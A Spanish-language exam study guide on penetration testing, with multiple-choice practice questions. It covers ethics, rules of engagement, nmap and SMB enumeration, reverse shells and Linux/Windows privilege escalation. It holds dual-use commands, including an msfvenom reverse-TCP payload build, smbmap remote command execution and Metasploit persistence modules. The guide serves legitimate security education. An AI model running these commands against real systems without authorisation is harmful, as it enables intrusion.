# üéØ GU√çA DE ESTUDIO - UNIDAD 8: Penetration Testing
## M√©todo para Examen Multiple Choice

---

## üìö PARTE 1: DEFINICI√ìN Y CONCEPTOS B√ÅSICOS

### üîë ¬øQU√â ES UN PENETRATION TESTING?

**DEFINICI√ìN CLAVE:**
Intento **autorizado y √©tico** de probar y analizar las defensas de seguridad de un sistema, redes o aplicaciones para **proteger** estos activos.

**PALABRAS CLAVE:**
- **AUTORIZADO** (con permiso)
- **√âTICO** (no malicioso)
- Usa mismas herramientas/t√©cnicas que un atacante real

**OBJETIVOS:**
1. Identificar y evaluar **vulnerabilidades**
2. Determinar **impacto potencial** de explotaci√≥n
3. Evaluar **efectividad** de controles existentes
4. Proporcionar **recomendaciones** para mejorar seguridad

**üí° ASOCIACI√ìN:**
Pentest = Hackear **CON PERMISO** para **PROTEGER**

---

### üîë √âTICA DEL PENETRATION TESTING

**PRINCIPIOS:**
- **Profesionalismo**
- **Legalidad**
- **Transparencia**
- **Respeto** por privacidad y seguridad

**üí° IMPORTANTE:**
No solo protege reputaci√≥n del tester, mejora seguridad de organizaciones y promueve pr√°cticas responsables.

---

### üîë ROE (RULES OF ENGAGEMENT)

**DEFINICI√ìN:**
Documento que se crea en **etapas iniciales** del pentest. Es un **acuerdo detallado** entre cliente y equipo de pruebas.

**QU√â INCLUYE:**
- **Permiso expl√≠cito** para realizar pruebas
- **L√≠mites, condiciones y alcance**
- Qu√© sistemas pueden ser evaluados
- Cu√°ndo y c√≥mo pueden realizarse
- Qu√© t√©cnicas est√°n permitidas/prohibidas
- C√≥mo se informar√°n hallazgos
- Qu√© acciones tomar para mitigar riesgos

**üí° ASOCIACI√ìN:**
ROE = **Contrato** que define **QU√â, C√ìMO, CU√ÅNDO y D√ìNDE** del pentest

**‚ùì PREGUNTA TIPO EXAMEN:**
> *¬øQu√© es el ROE en un pentest?*
- ‚úÖ Acuerdo que establece l√≠mites, condiciones y alcance
- ‚ùå Una herramienta de escaneo
- ‚ùå Un tipo de exploit

> *¬øCu√°ndo se crea el ROE?*
- ‚úÖ En las etapas iniciales del pentest
- ‚ùå Despu√©s de la explotaci√≥n
- ‚ùå En el reporte final

---

### üîë PLATAFORMAS PARA PRACTICAR

**EJEMPLOS:**
- **Dockerlabs** ‚Üí M√°quinas vulnerables en contenedores
- **HackTheBox**
- **TryHackMe**
- **VulnHub**

**BUG BOUNTY:**
Programas que **recompensan** a investigadores por encontrar y reportar vulnerabilidades.

**PLATAFORMAS BUG BOUNTY:**
- HackerOne
- Bugcrowd
- Intigriti

**CONSIDERACIONES LEGALES:**
- ‚úÖ Verificar scope y reglas
- ‚ùå **NUNCA** explotar datos sensibles en producci√≥n sin permiso
- ‚úÖ Leer contrato y pol√≠ticas de divulgaci√≥n

---

### üîë SISTEMAS OPERATIVOS PARA SEGURIDAD

**PRINCIPALES:**
- **Kali Linux** ‚≠ê (el m√°s usado)
- Kali Purple
- Parrot OS
- BlackArch Linux
- Wifislax

**üí° ASOCIACI√ìN:**
Kali Linux = **Distribuci√≥n especializada** en pentesting

---

## üìö PARTE 2: ETAPAS DE UN PENETRATION TESTING

### üîë LAS 5 ETAPAS (¬°MUY IMPORTANTE!)

**TABLA DE ETAPAS:**

| # | Etapa | Qu√© se hace | Palabras clave |
|---|-------|-------------|----------------|
| **1** | **Information Gathering** | Recopilar informaci√≥n sobre el objetivo | Passive + Active, OSINT |
| **2** | **Reconocimiento/Enumeraci√≥n** | Descubrir hosts, puertos, servicios | Nmap, escaneo |
| **3** | **Explotaci√≥n (Acceso Inicial)** | Explotar vulnerabilidades | Exploit, shell |
| **4** | **Post-Explotaci√≥n** | Escalaci√≥n, movimiento lateral, persistencia | Privilegios, pivoting |
| **5** | **Reporte** | Documentar hallazgos y recomendaciones | T√©cnico + Ejecutivo |

**üí° REGLA MNEMOT√âCNICA (IREPR):**
- **I**nformation Gathering
- **R**econocimiento
- **E**xplotaci√≥n
- **P**ost-explotaci√≥n
- **R**eporte

**‚ùì PREGUNTA TIPO EXAMEN:**
> *¬øEn qu√© etapa se recopila informaci√≥n sin interactuar con el objetivo?*
- ‚úÖ Information Gathering (passive)
- ‚ùå Explotaci√≥n
- ‚ùå Post-explotaci√≥n

> *¬øEn qu√© etapa se escalan privilegios?*
- ‚úÖ Post-explotaci√≥n
- ‚ùå Reconocimiento
- ‚ùå Information Gathering

---

## üìö PARTE 3: INFORMATION GATHERING

### üîë TIPOS DE INFORMATION GATHERING

**TABLA COMPARATIVA:**

| Tipo | Interacci√≥n | Qu√© se hace | Ejemplos |
|------|-------------|-------------|----------|
| **Passive** | **SIN** interactuar con objetivo | Informaci√≥n de fuentes p√∫blicas | OSINT, WHOIS, Google Dorks, Shodan |
| **Active** | **CON** interacci√≥n con objetivo | Escaneo directo (necesita autorizaci√≥n) | Nmap, ping, port scanning |

**üí° DIFERENCIA CLAVE:**
- **Passive** = No toca el objetivo directamente
- **Active** = S√≠ toca el objetivo (requiere permiso)

---

### üîë PASSIVE INFORMATION GATHERING

**QU√â BUSCAMOS:**
- IPs e informaci√≥n DNS
- Nombres de dominio y ownership
- Subdominios
- Emails y perfiles de redes sociales
- Tecnolog√≠as web utilizadas

**HERRAMIENTAS:**

**1. OSINT (Open-Source Intelligence):**
- **Fuentes**: Internet, registros p√∫blicos, medios, datos gubernamentales/comerciales

**2. Browsing Internet Resources:**
- Navegar sitio web de empresa objetivo
- Ver ofertas de empleo (tecnolog√≠as, contactos)

**3. Google Dorks (Google Hacking):**
- B√∫squedas avanzadas con operadores especiales
- Ejemplos:
  - `site:*.sitename.com`
  - `inurl:passwd.txt`
  - `filetype:sql "MySQL dump" password`
- Recurso: https://www.exploit-db.com/google-hacking-database

**4. Shodan:**
- Motor de b√∫squeda de **dispositivos conectados a Internet**
- Indexa routers, servidores, IoT
- Muestra: IPs, servicios, puertos, vulnerabilidades
- https://www.shodan.io/

**5. Censys:**
- Similar a Shodan
- Escanea internet con **Zmap**
- https://search.censys.io/

**6. WHOIS:**
- Registro de qui√©n posee un dominio
- Informaci√≥n de contacto, IPs p√∫blicas
- Comando: `whois <domain>`

**7. dnsrecon:**
- Reconocimiento y enumeraci√≥n DNS
- Comando: `dnsrecon -d <domain>`
- Alternativa web: https://dnsdumpster.com/

**8. whatweb / Wappalyzer:**
- Identificar tecnolog√≠as del sitio web
- `whatweb https://example.com`

**9. wafw00f:**
- Detectar presencia de WAF (Web Application Firewall)
- `wafw00f https://example.com -a`

**10. Sublist3r:**
- Enumeraci√≥n de subdominios
- `sublist3r -d <domain>`

**11. theHarvester:**
- Buscar emails
- `theHarvester -d <HOST> -b all`

**12. exiftool:**
- Extracci√≥n de metadatos de documentos
- `exiftool documento.pdf`

**13. HaveIBeenPwned:**
- Verificar si contrase√±as fueron comprometidas
- https://haveibeenpwned.com/

**‚ùì PREGUNTAS TIPO EXAMEN:**

> *Shodan se utiliza para:*
- ‚úÖ Buscar dispositivos conectados a Internet
- ‚ùå Escanear puertos localmente
- ‚ùå Compilar exploits

> *Google Dorks es una t√©cnica de:*
- ‚úÖ B√∫squeda avanzada en Google
- ‚ùå Explotaci√≥n de vulnerabilidades
- ‚ùå Escalaci√≥n de privilegios

> *WHOIS proporciona informaci√≥n sobre:*
- ‚úÖ Qui√©n posee un dominio
- ‚ùå Vulnerabilidades del servidor
- ‚ùå Contrase√±as de usuarios

> *¬øQu√© herramienta detecta la presencia de un WAF?*
- ‚úÖ wafw00f
- ‚ùå nmap
- ‚ùå WHOIS

---

### üîë ACTIVE INFORMATION GATHERING

**QU√â BUSCAMOS:**
- Puertos abiertos
- Infraestructura interna
- Enumeraci√≥n de sistemas

---

### üîë HOST DISCOVERY

**T√âCNICAS:**

**1. Ping Sweep:**
- Env√≠o de **ICMP Echo Request** (Type 8)
- Respuesta: **ICMP Echo Reply** (Type 0) = host vivo
- Comandos:
  - `nmap -sn <TARGET_NETWORK>`
  - `fping -I <interface> -g <TARGET_NETWORK> -a 2>/dev/null`

**2. ARP Scanning:**
- Usa **Address Resolution Protocol**
- Para descubrir hosts en red local
- Comandos:
  - `arp-scan -I <interface> --ignoredups <TARGET_NETWORK>`
  - `netdiscover -i <interface> -r <TARGET_NETWORK>`

**3. TCP SYN (Half-Open Scan):**
- Env√≠a TCP SYN a puerto espec√≠fico
- Respuesta SYN-ACK = host vivo
- Responde con RST (no establece conexi√≥n completa)
- M√°s sigiloso que ICMP

**üí° ASOCIACI√ìN:**
- Ping = ICMP
- ARP = Red local
- TCP SYN = M√°s sigiloso

---

### üîë PORT SCANNING CON NMAP ‚≠ê‚≠ê‚≠ê

**NMAP = Esc√°ner de puertos por excelencia**

**PUERTOS/SERVICIOS COMUNES:**
- 20/21: FTP
- 22: SSH
- 23: Telnet
- 25: SMTP
- 53: DNS
- 80: HTTP
- 110: POP3
- 443: HTTPS
- 445: SMB
- 3306: MySQL
- 3389: RDP
- 8080: HTTP/Proxy

---

### üîë PAR√ÅMETROS NMAP (¬°MEMORIZAR!)

**TABLA DE PAR√ÅMETROS:**

| Par√°metro | Qu√© hace | Uso |
|-----------|----------|-----|
| `-p-` | Escanea **TODOS los 65535 puertos** | Completo |
| `--top-ports 1000` | Escanea top 1000 puertos | R√°pido |
| `--open` | Reporta solo puertos **ABIERTOS** | Filtro |
| `-sS` | **Stealth Scan** (TCP SYN, Half-Open) | Sigiloso ‚≠ê |
| `-sT` | TCP Connect (conexi√≥n completa) | Cuando -sS no disponible |
| `-sU` | Escaneo **UDP** | UDP |
| `-sC` | Lanza **scripts b√°sicos** de enumeraci√≥n | Enum |
| `-sV` | Detecta **versi√≥n y servicios** | Versi√≥n ‚≠ê |
| `-O` | Detecta **sistema operativo** (agresivo) | OS |
| `-oN` | Exportar formato **normal** | Output |
| `-oG` | Exportar formato **grepeable** | Output |
| `-oX` | Exportar formato **XML** | Output |
| `-n` | No resoluci√≥n DNS | R√°pido |
| `-Pn` | Sin ping previo | Firewall |
| `--min-rate 5000` | Velocidad m√≠nima de paquetes | R√°pido |
| `-vvv` | Verbosidad alta | Detalles |

**COMANDOS T√çPICOS:**
```bash
# Escaneo inicial r√°pido
nmap -p- --open --min-rate 5000 -vvv -sS -n -Pn <IP> -oN tcpScan.txt

# Escaneo completo de puertos abiertos
nmap -sCV -p<puertos_abiertos> <IP> -oN fullScan.txt
```

**CATEGOR√çAS DE SCRIPTS NSE:**
- **default**: Scripts b√°sicos predeterminados
- **discovery**: Descubrimiento de red
- **safe**: Seguros, no invasivos
- **intrusive**: Invasivos (detectables)
- **vuln**: Detecci√≥n de vulnerabilidades

**EJEMPLO:**
```bash
nmap -p445 --script "vuln and safe" <ip_victima>
```

**‚ùì PREGUNTAS TIPO EXAMEN:**

> *¬øQu√© par√°metro de nmap es el m√°s sigiloso?*
- ‚úÖ -sS (Stealth Scan)
- ‚ùå -sT (TCP Connect)
- ‚ùå -O

> *Para escanear todos los puertos con nmap se usa:*
- ‚úÖ -p-
- ‚ùå -p 1-65535
- ‚ùå --all-ports

> *¬øQu√© par√°metro detecta versiones de servicios?*
- ‚úÖ -sV
- ‚ùå -sS
- ‚ùå -O

> *-sC en nmap sirve para:*
- ‚úÖ Lanzar scripts b√°sicos de enumeraci√≥n
- ‚ùå Escanear puertos TCP
- ‚ùå Exportar resultados

---

### üîë ENUMERACI√ìN DE SUBDOMINIOS Y FUZZING

**SUBDOMINIOS (ACTIVO):**
- **gobuster** (https://github.com/OJ/gobuster)
- **wfuzz** (https://github.com/xmendez/wfuzz)
- Diccionario com√∫n: `/usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt`

**FUZZING:**
Descubrir **rutas y recursos ocultos** en servidor web mediante **fuerza bruta**.

**HERRAMIENTAS:**
- gobuster
- wfuzz
- dirb
- dirbuster
- dirsearch

**DICCIONARIO COM√öN:**
`SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt`

**EJEMPLO GOBUSTER:**
```bash
gobuster dir -u <url> -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 50 -b 403,404 -x php,html,txt
```

**‚ùì PREGUNTA TIPO EXAMEN:**
> *Fuzzing se utiliza para:*
- ‚úÖ Descubrir rutas y recursos ocultos en servidor web
- ‚ùå Escanear puertos abiertos
- ‚ùå Detectar sistema operativo

---

## üìö PARTE 4: ENUMERACI√ìN

### üîë ¬øQU√â SE ENUMERA?

**LISTA:**
- Enumeraci√≥n de **servicios**
- Enumeraci√≥n de **usuarios**
- Enumeraci√≥n de **recursos compartidos**
- Enumeraci√≥n de **pol√≠ticas de seguridad**
- Enumeraci√≥n de **vulnerabilidades**
- Enumeraci√≥n de **vectores de ataque**

---

### üîë HERRAMIENTAS DE ENUMERACI√ìN

**PRINCIPALES:**
- nmap (scripts)
- Metasploit Framework (m√≥dulos Auxiliary)
- **SMBMap** ‚Üí Enumeraci√≥n SMB
- **SMBClient** ‚Üí Cliente SMB
- **enum4linux** ‚Üí Enumeraci√≥n Linux/SMB
- rpcclient
- smtp-user-enum
- wpscan (WordPress)
- droopscan (Drupal)

---

### üîë ENUMERACI√ìN SMB (¬°IMPORTANTE!)

**SMBClient:**
```bash
# Listar recursos con Null Session
smbclient -L <TARGET_IP> -N

# Conectar a recurso
smbclient //<TARGET_IP>/notes -N
smbclient //<TARGET_IP>/admin -U admin

# Comandos dentro:
help
put <filename>
get <filename>
```

**SMBMap:**
```bash
# Con Null Session
smbmap -H <TARGET_IP>
smbmap -u guest -p "" -d . -H <TARGET_IP>

# Con credenciales
smbmap -u <USER> -p '<PW>' -d . -H <TARGET_IP>

# Explorar directorios
smbmap -H <TARGET_IP> -r notes

# Ejecutar comando
smbmap -u <USER> -p '<PW>' -H <TARGET_IP> -x 'ipconfig'
```

**üí° ASOCIACI√ìN:**
- SMB = Puerto **445**
- Null Session = Sin credenciales (guest)

**‚ùì PREGUNTA TIPO EXAMEN:**
> *¬øQu√© puerto usa SMB?*
- ‚úÖ 445
- ‚ùå 443
- ‚ùå 3389

> *Una Null Session significa:*
- ‚úÖ Conexi√≥n sin credenciales
- ‚ùå Conexi√≥n cifrada
- ‚ùå Conexi√≥n por SSH

---

## üìö PARTE 5: EXPLOTACI√ìN (ACCESO INICIAL)

### üîë TIPOS DE EXPLOTACI√ìN

**TABLA COMPARATIVA:**

| Tipo | Caracter√≠sticas | Ventajas | Desventajas |
|------|-----------------|----------|-------------|
| **Manual** | Conocimiento profundo, control preciso | Mayor control, m√°s preciso | M√°s lento, requiere habilidad |
| **Automatizada** | Scripts/herramientas autom√°ticas | M√°s r√°pido, menos laborioso | Menos preciso, m√°s ruido, detectable |

**üí° CONCEPTO:**
Tipo de explotaci√≥n depende de: objetivos, habilidades, nivel de seguridad del objetivo

---

### üîë REVERSE SHELL vs BIND SHELL

**TABLA COMPARATIVA:**

| Tipo | Direcci√≥n | C√≥mo funciona | Ventaja |
|------|-----------|---------------|---------|
| **Reverse Shell** | V√≠ctima ‚Üí Atacante | M√°quina comprometida se **conecta** al atacante | **Evade firewalls** (tr√°fico saliente) ‚≠ê |
| **Bind Shell** | Atacante ‚Üí V√≠ctima | V√≠ctima se pone a la **escucha**, atacante se conecta | - |

**üí° ASOCIACI√ìN:**
- **Reverse** = V√≠ctima llama al atacante (m√°s com√∫n)
- **Bind** = Atacante llama a la v√≠ctima

**‚ùì PREGUNTA TIPO EXAMEN:**
> *¬øQu√© tipo de shell evade mejor los firewalls?*
- ‚úÖ Reverse Shell
- ‚ùå Bind Shell
- ‚ùå Ambas igual

> *En una Reverse Shell, ¬øqui√©n inicia la conexi√≥n?*
- ‚úÖ La m√°quina comprometida
- ‚ùå El atacante
- ‚ùå El firewall

---

### üîë TIPOS DE PAYLOADS

**TABLA COMPARATIVA:**

| Tipo | Caracter√≠sticas | Ejemplo |
|------|-----------------|---------|
| **Staged** | Se divide en **2+ etapas** | Primera = conexi√≥n, Segunda = payload real |
| **Non-Staged** | Se env√≠a **una sola entidad** | Todo el c√≥digo en un solo paquete |

**STAGED:**
- **Ventaja**: Sortea medidas de seguridad (payload real despu√©s)
- **Desventaja**: M√°s complejo

**NON-STAGED:**
- **Ventaja**: M√°s simple
- **Desventaja**: M√°s f√°cil de detectar

**HERRAMIENTA:**
**msfvenom** ‚Üí Genera payloads

**EJEMPLO:**
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp --platform windows -a x64 LHOST=192.168.1.165 LPORT=4646 -f exe -o reverse.exe
```

**‚ùì PREGUNTA TIPO EXAMEN:**
> *Un payload Staged se caracteriza por:*
- ‚úÖ Dividirse en m√∫ltiples etapas
- ‚ùå Enviarse todo de una vez
- ‚ùå Ser m√°s f√°cil de detectar

---

### üîë HERRAMIENTAS DE EXPLOTACI√ìN

**METASPLOIT FRAMEWORK:**
- Open-source (Rapid7)
- Desarrollado en **Ruby**
- Base de datos de exploits p√∫blicos m√°s grande
- Modular

**BURPSUITE:**
- Auditor√≠a de seguridad en **aplicaciones web**
- Desarrollado por PortSwigger
- **Caracter√≠sticas**:
  - **Proxy de interceptaci√≥n** ‚Üí Interceptar/modificar HTTP
  - Esc√°ner de vulnerabilidades (versi√≥n pro)
  - **Repeater** ‚Üí Modificar y enviar requests manualmente
  - **Intruder** ‚Üí Fuerza bruta, fuzzing

**SQLMAP:**
- Open source
- Automatiza detecci√≥n y explotaci√≥n de **SQL Injection**
- Muy poderosa para SQLi

**‚ùì PREGUNTA TIPO EXAMEN:**
> *Metasploit est√° desarrollado en:*
- ‚úÖ Ruby
- ‚ùå Python
- ‚ùå C++

> *BurpSuite se especializa en:*
- ‚úÖ Auditor√≠a de aplicaciones web
- ‚ùå Escaneo de puertos
- ‚ùå An√°lisis de malware

> *SQLMap se usa para:*
- ‚úÖ Detectar y explotar SQL Injection
- ‚ùå Escanear redes
- ‚ùå Generar payloads

---

### üîë CASO: SHELLSHOCK (CVE-2014-6271)

**DEFINICI√ìN:**
Vulnerabilidad en **Bash** (desde V1.3) que permite ejecutar comandos arbitrarios remotos.

**C√ìMO FUNCIONA:**
- Bash ejecuta por error comandos despu√©s de: `() {:;};`
- Servidores Apache con scripts **CGI** o **.sh** son vulnerables

**EXPLOTACI√ìN:**
- Localizar vector de entrada o script CGI
- Al ejecutarse script CGI ‚Üí servidor inicia proceso con Bash
- Se puede explotar manual o automatizado (MSF)

**üí° ASOCIACI√ìN:**
Shellshock = Bash + CGI = RCE

---

## üìö PARTE 6: POST-EXPLOTACI√ìN

### üîë ¬øQU√â ES POST-EXPLOTACI√ìN?

**DEFINICI√ìN:**
Acciones despu√©s de obtener acceso inicial.

**TAREAS:**
1. **Enumeraci√≥n local**
2. **Escalaci√≥n de privilegios** ‚≠ê
3. Acceso a credenciales
4. **Movimiento Lateral / Pivoting**
5. **Persistencia**
6. Limpiar rastros

---

### üîë ENUMERACI√ìN LOCAL

**QU√â BUSCAR:**
- Versi√≥n exacta de SO y arquitectura (x64/x86)
- OS Build & Service Pack / Kernel version
- Updates/Hotfixes instalados
- Usuario actual y privilegios
- Otros usuarios en el sistema
- Grupos existentes
- Miembros de "Administrators"
- Adaptadores de red y rutas
- Servicios corriendo
- Tareas scheduladas / cron jobs

**HERRAMIENTAS:**
- Scripts de enumeraci√≥n autom√°tica
- Comandos nativos del SO

---

### üîë ESCALACI√ìN DE PRIVILEGIOS

**DEFINICI√ìN:**
Proceso de **aumentar privilegios** en sistema comprometido para obtener privilegios m√°s altos (ej: root, Administrator).

**SE ABUSA DE:**
- Vulnerabilidades existentes
- Malas configuraciones

**VAR√çA SEG√öN:** Sistema operativo (Linux vs Windows)

---

## üìö PARTE 7: ESCALACI√ìN EN LINUX

### üîë HERRAMIENTAS LINUX

**LinEnum:**
- Identifica vulnerabilidades para escalar privilegios
- https://github.com/rebootuser/LinEnum

**Linux Exploit Suggester:**
- Detecta deficiencias de seguridad del kernel
- https://github.com/mzet-/linux-exploit-suggester

---

### üîë T√âCNICAS DE ESCALACI√ìN EN LINUX

**LISTA DE T√âCNICAS:**

1. **Explotaci√≥n de permisos SUID** ‚≠ê‚≠ê
2. **Abuso de sudoers** ‚≠ê‚≠ê
3. **Explotaci√≥n de capabilities**
4. **Uso de exploits del kernel** (ej: DirtyCOW - CVE-2016-5195)
5. **Path Hijacking**
6. **Cron Jobs mal configurados** ‚≠ê
7. **Writable files** (archivos cr√≠ticos con permisos mal otorgados)

---

### üîë PERMISOS EN LINUX

**NOTACI√ìN:**
- `(-)` Sin permiso
- `(r)` Lectura
- `(w)` Escritura
- `(x)` Ejecuci√≥n

**ASIGNACI√ìN:**
- Comando `chmod`
- Notaci√≥n octal (ej: 755, 644)

**PERMISOS ESPECIALES:**
- **SUID** (Set User ID) ‚≠ê

---

### üîë ABUSO DE SUID ‚≠ê‚≠ê‚≠ê

**DEFINICI√ìN:**
Cuando el bit **SUID** est√° activado en un binario, quien lo ejecute tendr√° los **mismos permisos que el propietario**.

**EJEMPLO LEG√çTIMO:**
`passwd` ‚Üí Necesita privilegios root para modificar `/etc/passwd` o `/etc/shadow`

**RIESGO:**
Algunos binarios del sistema con SUID permiten obtener shell como root desde usuario no privilegiado.

**BUSCAR SUID:**
```bash
find / -perm -4000 2>/dev/null
```

**RECURSO:**
https://gtfobins.github.io/

**üí° ASOCIACI√ìN:**
SUID = Ejecutar como **propietario** del archivo

**‚ùì PREGUNTA TIPO EXAMEN:**
> *SUID permite:*
- ‚úÖ Ejecutar binario con permisos del propietario
- ‚ùå Solo leer archivos
- ‚ùå Escribir en cualquier directorio

> *¬øQu√© comando busca binarios con SUID?*
- ‚úÖ find / -perm -4000 2>/dev/null
- ‚ùå chmod +x
- ‚ùå sudo -l

---

### üîë ABUSO DE SUDOERS ‚≠ê‚≠ê‚≠ê

**ARCHIVO:**
`/etc/sudoers` ‚Üí Lista de usuarios/grupos con permisos sudo

**COMANDO SUDO:**
Permite ejecutar comandos como superusuario o con privilegios especiales.

**IDENTIFICAR:**
```bash
sudo -l
```

**RIESGO:**
Si atacante accede a cuenta con sudo mal configurado ‚Üí puede ejecutar comandos privilegiados.

**RECURSO:**
https://gtfobins.github.io/

**‚ùì PREGUNTA TIPO EXAMEN:**
> *¬øQu√© archivo controla los permisos de sudo?*
- ‚úÖ /etc/sudoers
- ‚ùå /etc/passwd
- ‚ùå /etc/shadow

> *Para ver qu√© comandos puede ejecutar un usuario con sudo:*
- ‚úÖ sudo -l
- ‚ùå sudo --list
- ‚ùå cat /etc/sudoers

---

### üîë ABUSO DEL KERNEL

**DEFINICI√ìN:**
Explotar vulnerabilidades en el **kernel** (parte central del SO) que administra recursos.

**MITIGACI√ìN:**
Mantener sistema actualizado y aplicar parches.

**EJEMPLO FAMOSO:**
**DirtyCOW** (CVE-2016-5195)

---

### üîë TAREAS CRON ‚≠ê‚≠ê

**DEFINICI√ìN:**
Tareas **programadas** en Unix/Linux que se ejecutan en intervalos de tiempo.

**ARCHIVO:**
`crontab` ‚Üí Define qu√© comandos y cu√°ndo ejecutar

**RIESGO:**
Si archivo ejecutado por **root** tiene **permisos mal configurados** ‚Üí atacante puede modificarlo para incluir c√≥digo malicioso que se ejecutar√° como root.

**HERRAMIENTA:**
**PsPy** ‚Üí Encontrar binarios que se ejecutan a intervalos regulares
- https://github.com/DominicBreuker/pspy

**RECURSO √öTIL:**
https://www.site24x7.com/es/tools/crontab/cron-generator.html

**‚ùì PREGUNTA TIPO EXAMEN:**
> *Las tareas cron se definen en:*
- ‚úÖ crontab
- ‚ùå /etc/passwd
- ‚ùå sudoers

> *PsPy se usa para:*
- ‚úÖ Encontrar binarios que se ejecutan peri√≥dicamente
- ‚ùå Escanear puertos
- ‚ùå Generar payloads

---

### üîë PATH HIJACKING

**DEFINICI√ìN:**
T√©cnica para **secuestrar comandos** mediante manipulaci√≥n del **PATH**.

**PATH:**
Variable de entorno que define rutas de b√∫squeda para ejecutables.

**C√ìMO FUNCIONA:**
1. Binario usa comando con **ruta relativa** (ej: `ls`) en vez de **ruta absoluta** (ej: `/bin/ls`)
2. Atacante altera PATH
3. Atacante crea archivo malicioso con mismo nombre (`ls`)
4. Binario ejecuta versi√≥n maliciosa

**PREVENCI√ìN:**
Usar **rutas absolutas** en binarios compilados.

---

### üîë PYTHON LIBRARY HIJACKING

**DEFINICI√ìN:**
Aprovecha c√≥mo Python busca y carga bibliotecas para inyectar c√≥digo malicioso.

**C√ìMO FUNCIONA:**
1. Atacante reemplaza biblioteca por versi√≥n maliciosa
2. Coloca versi√≥n maliciosa en ruta accesible
3. Python carga la maliciosa en vez de leg√≠tima

**ORDEN DE B√öSQUEDA:**
1. **Directorio actual de trabajo** (primero)
2. Rutas en **sys.path**

**RIESGO:**
Si atacante tiene acceso de escritura en `sys.path` o directorio actual ‚Üí puede secuestrar bibliotecas.

---

### üîë ABUSO DE CAPABILITIES

**DEFINICI√ìN:**
Funcionalidad que permite realizar acciones que normalmente requieren root, **sin** dar acceso completo de superusuario.

**BENEFICIO:**
Ejecutar tareas privilegiadas con **m√≠nimos permisos** necesarios.

**RIESGO:**
Asignaci√≥n arbitraria puede ser aprovechada para operaciones no contempladas.

**LISTAR CAPABILITIES:**
```bash
getcap -r / 2>/dev/null
```

---

### üîë ARCHIVOS CR√çTICOS CON PERMISOS MAL OTORGADOS

**EJEMPLOS:**
- `/etc/passwd` ‚Üí Informaci√≥n de usuarios
- `/etc/shadow` ‚Üí Contrase√±as hasheadas

**RIESGO:**
Si tienen permisos de escritura ‚Üí atacante puede modificarlos para escalar privilegios.

---

## üìö PARTE 8: ESCALACI√ìN EN WINDOWS

### üîë METODOLOG√çA WINDOWS

**PROCESO:**
1. Identificaci√≥n de vulnerabilidades en kernel
2. Descargar, compilar y transferir exploits

**HERRAMIENTAS:**

**Windows Exploit Suggester:**
- Compara niveles de parches con base de datos Microsoft
- https://github.com/AonCyberLabs/Windows-Exploit-Suggester

**WES-NG (Next Generation):**
- https://github.com/bitsadmin/wesng

**PowerUp.ps1 (PowerSploit):**
- Script PowerShell para escalaci√≥n por malas configuraciones
- https://github.com/PowerShellMafia/PowerSploit

---

### üîë UAC BYPASS

**UAC (User Account Control):**
Garantiza que cambios en SO requieran aprobaci√≥n de administrador.

**BYPASS UAC:**
Ejecutar proceso sin que UAC proporcione aprobaci√≥n.

**CONDICIONES PARA BYPASS:**
1. Usuario debe formar parte de grupo **Administradores**
2. Contexto de **integridad** debe ser **media** (por defecto)
3. Pol√≠tica de UAC debe estar en configuraci√≥n **por defecto**

**VERIFICAR:**
```bash
net user <USERNAME>
net localgroup administrators
```

**üí° IMPORTANTE:**
Herramientas y t√©cnicas var√≠an seg√∫n versi√≥n de Windows.

---

## üìö PARTE 9: PIVOTING Y PERSISTENCIA

### üîë PIVOTING

**DEFINICI√ìN:**
T√©cnica de post-explotaci√≥n para acceder a **redes a las que no tenemos acceso** normalmente mediante m√°quina comprometida.

**OBJETIVO:**
Llegar a donde al principio no pod√≠amos.

**üí° ASOCIACI√ìN:**
Pivoting = Usar m√°quina comprometida como **puente** a otras redes

---

### üîë PERSISTENCIA

**DEFINICI√ìN:**
T√©cnicas para **mantener el acceso** tras reinicios, cambios de credenciales u otras interrupciones.

**M√ìDULOS METASPLOIT:**
- Windows: `exploit/windows/local/persistence_service`
- Linux: `post/linux/manage/sshkey_persistence`

**üí° OBJETIVO:**
Garantizar acceso continuo al sistema comprometido.

---

## üìö PARTE 10: REPORTE (ETAPA 5)

### üîë IMPORTANCIA DE DOCUMENTAR

**DURANTE EL PENTEST:**
Documentar **todas las acciones y procedimientos**.

**CONTENIDO:**
- Qu√© trabajo se realiz√≥
- C√≥mo se hizo (herramientas y t√©cnicas)
- **Vulnerabilidades descubiertas** (lo m√°s importante)

---

### üîë DOS TIPOS DE REPORTE

**TABLA COMPARATIVA:**

| Tipo | Audiencia | Contenido | Nivel t√©cnico |
|------|-----------|-----------|---------------|
| **Informe T√©cnico** | T√©cnicos, analistas | Gran nivel de detalle, herramientas, resultados, **c√≥mo subsanar riesgos** | **ALTO** |
| **Informe Ejecutivo** | Direcci√≥n, gerencia | Vulnerabilidades encontradas sin detalles t√©cnicos, **cualquiera puede entender** | **BAJO** |

**üí° DIFERENCIA CLAVE:**
- **T√©cnico** = C√≥mo se hizo + C√≥mo arreglarlo (detallado)
- **Ejecutivo** = Qu√© se encontr√≥ (simple y ameno)

**‚ùì PREGUNTA TIPO EXAMEN:**
> *¬øQu√© tipo de informe es para la alta direcci√≥n?*
- ‚úÖ Informe Ejecutivo
- ‚ùå Informe T√©cnico
- ‚ùå Ambos por igual

> *El informe t√©cnico debe incluir:*
- ‚úÖ Nivel de detalle alto con herramientas y c√≥mo subsanar
- ‚ùå Solo vulnerabilidades sin detalles
- ‚ùå Solo resumen ejecutivo

---

## üéØ RESUMEN ULTRA-R√ÅPIDO (Para 10 min antes del examen)

### üìå DEFINICI√ìN:
Pentest = Hackear **CON PERMISO** para **PROTEGER**

### üìå ROE:
Acuerdo que establece **l√≠mites, condiciones y alcance** (etapas iniciales)

### üìå 5 ETAPAS (IREPR):
1. **I**nformation Gathering (Passive + Active)
2. **R**econocimiento/Enumeraci√≥n (nmap)
3. **E**xplotaci√≥n (exploit, shell)
4. **P**ost-explotaci√≥n (escalaci√≥n, persistencia)
5. **R**eporte (T√©cnico + Ejecutivo)

### üìå INFORMATION GATHERING:
- **Passive** = SIN tocar objetivo (OSINT, WHOIS, Shodan, Google Dorks)
- **Active** = CON interacci√≥n (nmap, ping, escaneo)

### üìå NMAP CLAVE:
- `-p-` = Todos los puertos
- `-sS` = Stealth Scan (sigiloso)
- `-sV` = Detectar versi√≥n
- `-sC` = Scripts b√°sicos
- `--open` = Solo abiertos

### üìå SHELLS:
- **Reverse** = V√≠ctima ‚Üí Atacante (evade firewall)
